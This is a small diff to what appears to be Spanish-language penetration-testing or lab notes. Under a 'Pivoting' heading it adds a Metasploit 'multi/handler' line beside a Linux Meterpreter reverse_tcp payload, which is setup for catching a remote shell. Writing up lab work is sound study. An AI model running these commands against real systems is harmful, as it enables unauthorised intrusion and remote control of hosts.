@@ -142,6 +142,9 @@ una vez tengamos todo configurado lanzamos el exploit y automaticamente tenemos 
 ```
 
 ### Pivoting 
+
+use /multi/handler
+
 ```python
 
 payload/linux/x86/meterpreter/reverse_tcp
